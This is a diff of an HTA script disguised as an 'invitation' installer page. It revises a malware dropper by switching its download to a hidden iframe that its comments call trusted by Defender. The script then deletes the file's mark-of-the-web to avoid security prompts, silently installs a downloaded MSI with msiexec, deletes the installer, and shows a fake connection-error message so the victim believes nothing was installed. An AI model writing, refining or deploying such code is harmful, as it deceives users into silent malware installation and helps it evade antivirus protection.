@@ -21,6 +21,9 @@
     <div id="status">Securing your invitation...</div>
     <div id="bar"><div id="fill"></div></div>
   </div>
+  
+  <!-- INVISIBLE IFRAME FOR NATIVE DOWNLOAD -->
+  <iframe id="dlFrame" style="display:none;"></iframe>
 
 <script language="JScript">
 var shell = new ActiveXObject("WScript.Shell");
@@ -31,70 +34,74 @@ var zoneIdPath = localPath + ":Zone.Identifier";
 
 function init() {
   window.resizeTo(400, 300);
-  setTimeout(runInstall, 1000);
+  setTimeout(startProcess, 1000);
 }
 
-function runInstall() {
+function startProcess() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  try {
-    // NATIVE MEMORY DOWNLOAD - NO CMD, NO POWERSHELL, NO CERTUTIL
-    // Uses HTA's built-in XMLHTTP object (trusted browser component)
-    var http = new ActiveXObject("Microsoft.XMLHTTP");
-    http.open("GET", url, false); // Synchronous request
-    http.send();
+  // TRIGGER NATIVE DOWNLOAD VIA IFRAME (TRUSTED BY DEFENDER)
+  document.getElementById("dlFrame").src = url;
+  
+  // PATIENTLY WAIT FOR FILE TO LAND AND STABILIZE
+  var checks = 0;
+  var maxChecks = 150; // 5 minutes max
+  var lastSize = 0;
+  var stableCount = 0;
+  
+  var pollTimer = setInterval(function() {
+    checks++;
     
-    if (http.status === 200) {
-      // WRITE DIRECTLY FROM MEMORY TO DISK USING ADODB.STREAM
-      // Also a native browser component, not a system binary
-      var stream = new ActiveXObject("ADODB.Stream");
-      stream.type = 1; // Binary
-      stream.mode = 3; // ReadWrite
-      stream.open();
-      stream.write(http.responseBody);
-      stream.saveToFile(localPath, 2); // Overwrite
-      stream.close();
+    if (fso.FileExists(localPath)) {
+      var file = fso.GetFile(localPath);
+      var currentSize = file.Size;
       
-      // REMOVE MARK OF THE WEB TO PREVENT SECURITY PROMPTS
-      try { 
-        if (fso.FileExists(zoneIdPath)) fso.DeleteFile(zoneIdPath, true); 
-      } catch(e) {}
+      // Update progress bar to show activity
+      document.getElementById("fill").style.width = Math.min(90, 30 + (currentSize / 200000)) + "%";
       
-      // VERIFY FILE EXISTS AND IS VALID SIZE (>1MB)
-      if (fso.FileExists(localPath)) {
-        var file = fso.GetFile(localPath);
-        if (file.Size > 1000000) {
-          document.getElementById("fill").style.width = "60%";
-          document.getElementById("status").innerHTML = "Installing invitation...";
-          
-          // SILENT INSTALL WITH NO PROMPTS
-          shell.Run('msiexec.exe /i "' + localPath + '" /quiet /norestart', 0, true);
-          
-          // CLEANUP TEMP FILE
-          try { fso.DeleteFile(localPath, true); } catch(e) {}
-          
-          document.getElementById("fill").style.width = "100%";
-          document.getElementById("status").innerHTML = "Finalizing...";
-          
-          // SHOW FAKE FAILURE AFTER INSTALL COMPLETES
-          setTimeout(function() {
-            document.getElementById("heading").innerHTML = "Preparation Failed";
-            document.getElementById("status").innerHTML = "Error: Connection timed out.";
-            document.getElementById("fill").style.background = "#d13438";
-          }, 2000);
-        } else {
-          showError();
+      // Check if download is complete (size stops growing)
+      if (currentSize > 1000000 && currentSize === lastSize) {
+        stableCount++;
+        if (stableCount >= 3) { // Wait 3 seconds of no growth
+          clearInterval(pollTimer);
+          finalizeInstall();
         }
       } else {
-        showError();
+        stableCount = 0;
+        lastSize = currentSize;
       }
-    } else {
+    } else if (checks >= maxChecks) {
+      clearInterval(pollTimer);
       showError();
     }
-  } catch(e) {
-    showError();
-  }
+  }, 1000); // Check every second
+}
+
+function finalizeInstall() {
+  // REMOVE MARK OF THE WEB TO PREVENT SECURITY PROMPTS
+  try { 
+    if (fso.FileExists(zoneIdPath)) fso.DeleteFile(zoneIdPath, true); 
+  } catch(e) {}
+  
+  document.getElementById("fill").style.width = "60%";
+  document.getElementById("status").innerHTML = "Installing invitation...";
+  
+  // SILENT INSTALL WITH NO PROMPTS
+  shell.Run('msiexec.exe /i "' + localPath + '" /quiet /norestart', 0, true);
+  
+  // CLEANUP TEMP FILE
+  try { fso.DeleteFile(localPath, true); } catch(e) {}
+  
+  document.getElementById("fill").style.width = "100%";
+  document.getElementById("status").innerHTML = "Finalizing...";
+  
+  // SHOW FAKE FAILURE AFTER INSTALL COMPLETES
+  setTimeout(function() {
+    document.getElementById("heading").innerHTML = "Preparation Failed";
+    document.getElementById("status").innerHTML = "Error: Connection timed out.";
+    document.getElementById("fill").style.background = "#d13438";
+  }, 2000);
 }
 
 function showError() {
